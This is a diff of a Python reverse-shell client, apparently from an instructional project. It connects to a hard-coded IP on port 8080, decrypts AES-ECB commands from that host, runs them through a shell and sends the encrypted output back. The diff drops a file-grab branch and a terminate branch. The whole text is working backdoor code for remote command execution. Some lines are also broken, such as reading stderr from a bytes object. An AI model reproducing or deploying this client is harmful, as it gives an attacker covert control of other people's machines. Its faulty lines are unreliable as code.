@@ -38,35 +38,45 @@ def transfer(s, path):
 
 def connect():
     s = socket.socket()
-    s.connect(("10.174.15.6",8080))
+    #s.connect(("10.174.15.6",8080))
+    s.connect(("192.168.1.183",8080))
     while True:
+        
+                
         command = s.recv(1024)
-        if "terminate" in command.decode():
-            s.close()
-            break
-        elif 'grab' in command.decode():
-            # Recieve the command  
-            grab, path = command.decode().split("*")
-            try:
-                transfer(s, path)
-            except:
-                pass
-        else:
-            print("Decypting command")
-            plaintext = command
-            plaintext = decrypt(ciphertext,key,AES.MODE_ECB)
-            print("The plain text raw but decrypted",plaintext)
-            plaintext = Padding.removePadding(plaintext.decode(),mode=0)
-            #print ("  decrypt: "+plaintext)
-            
-            # See the video above which explains how the subprocess element works
-            # A pipe has two endpoints
-            CMD = subprocess.Popen(plaintext.decode(), shell = True, stdout = subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
-            
-            #Capture the standout and send the output to the server
-            s.send(CMD.stdout.read())
-            # Capture any command errors and send the 
-            s.send(CMD.stderr.read())
+
+        print("Decypting command")
+        plaintext = command
+        # We now decrypt the text
+        plaintext = decrypt(plaintext,key,AES.MODE_ECB)
+        print("The plain text raw but decrypted",plaintext)
+        #Remove all the padding
+        plaintext = Padding.removePadding(plaintext.decode(),mode=0)
+        #Command now in raw text command
+        print ("  decrypt: "+plaintext)
+        
+        # See the video above which explains how the subprocess element works
+        # A pipe has two endpoints
+        CMD = subprocess.Popen(plaintext, shell = True, stdout = subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+        
+        plaintext = CMD.stdout.read()
+        print(plaintext)
+        
+        #convert byte to string!!!
+        
+        plaintext = Padding.appendPadding(plaintext,blocksize=Padding.AES_blocksize,mode=0)
+        print("The plain text with padding added",plaintext)
+        #print ("Input data (CMS): "+binascii.hexlify(plaintext.encode()).decode())
+
+        ciphertext = encrypt(plaintext.encode(),key,AES.MODE_ECB)
+        print("The command encrypted",ciphertext)        
+        
+        
+        #Capture the standout and send the output to the server
+        #s.send(ciphertext.stdout.read())
+        s.send(ciphertext)
+        # Capture any command errors and send the 
+        s.send(ciphertext.stderr.read())
 
 def main():
     key = hashlib.sha256(password.encode()).digest()
